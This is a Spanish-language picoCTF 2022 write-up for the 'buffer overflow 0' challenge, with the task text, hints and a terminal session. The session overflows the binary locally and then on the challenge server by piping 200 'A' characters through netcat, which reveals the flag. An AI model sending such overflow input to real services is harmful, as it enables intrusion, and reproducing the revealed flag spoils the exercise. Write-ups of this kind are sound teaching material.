# Binary Explotation

## Descripcion

Smash the stack Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/522/vuln). You can view source [here](https://artifacts.picoctf.net/c/522/vuln.c). And connect with it using: `nc saturn.picoctf.net 51110`

## Pistas (Si hay)

1.- How can you trigger the flag to print?

2.- If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.

3.- Run `man gets` and read the BUGS section. How many characters can the program really read?

## Solución

``` Bash

┌──(kali㉿kali)-[~/…/Obsidian Vault/picoCTF/Retos Binary Explotation picoCTF 2022 Parte 1/buffer overflow 0]
└─$ echo 'flag{dummieflag}' > flag.txt                    
                                                                                                                    
┌──(kali㉿kali)-[~/…/Obsidian Vault/picoCTF/Retos Binary Explotation picoCTF 2022 Parte 1/buffer overflow 0]
└─$ ./vuln                                                
Input: asdfasdfafsd
The program will exit now
                                                                                                                    
┌──(kali㉿kali)-[~/…/Obsidian Vault/picoCTF/Retos Binary Explotation picoCTF 2022 Parte 1/buffer overflow 0]
└─$ ./vuln                            
Input: wertwertttttttttttttttwertwertwertwer    wefqwefqwefqertqeryqrtqerfqergqwerqegergqergqergqergqergqergqergqergqeqiwuehfpuqwhefupoqwehfpqouwihefpuqwefhpuoiqwhfepuqwehfpuoqwhefpuoiqhwefpuwqhefpoiuwqhefpuqowhefpouwqhefpuoiqwhefpouqwhefpoiuqwhefpouqwehfpqwoiuefhqpwueofqwpeuhf
flag{dummieflag}

                                                                                                                    
┌──(kali㉿kali)-[~/…/Obsidian Vault/picoCTF/Retos Binary Explotation picoCTF 2022 Parte 1/buffer overflow 0]
└─$ nc saturn.picoctf.net 51110
Input: wertwertttttttttttttttwertwertwertwer    wefqwefqwefqertqeryqrtqerfqergqwerqegergqergqergqergqergqergqergqergqeqiwuehfpuqwhefupoqwehfpqouwihefpuqwefhpuoiqwhfepuqwehfpuoqwhefpuoiqhwefpuwqhefpoiuwqhefpuqowhefpouwqhefpuoiqwhefpouqwhefpoiuqwhefpouqwehfpqwoiuefhqpwueofqwpeuhf
                                                                                                                    
┌──(kali㉿kali)-[~/…/Obsidian Vault/picoCTF/Retos Binary Explotation picoCTF 2022 Parte 1/buffer overflow 0]
└─$ nc saturn.picoctf.net 51110 <<< $(python3 -c "print('A'*200)")
Input: picoCTF{ov3rfl0ws_ar3nt_that_bad_8ba275ff}


```

## Referencias